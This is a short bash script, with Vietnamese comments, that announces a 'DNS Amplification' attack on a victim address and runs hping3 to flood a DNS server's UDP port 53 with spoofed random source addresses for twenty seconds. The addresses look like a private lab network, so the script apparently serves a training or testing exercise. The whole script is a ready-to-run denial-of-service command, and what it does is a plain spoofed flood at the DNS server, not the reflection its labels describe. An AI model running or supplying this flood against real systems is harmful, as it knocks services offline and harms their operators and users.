#!/bin/bash
VICTIM=10.0.2.10
DNS=10.0.2.11
DURATION=20

echo "Bat dau DNS Amplification vao $VICTIM (thong qua $DNS) trong $DURATION giay..."

# Gui UDP flood toi DNS port 53 voi nhieu random source port
# Mo phong DNS amplification bang cach flood UDP packets toi DNS server
timeout $DURATION hping3 --udp -p 53 --rand-source -i u500 $DNS
echo "Hoan tat tan cong DNS Amplification!"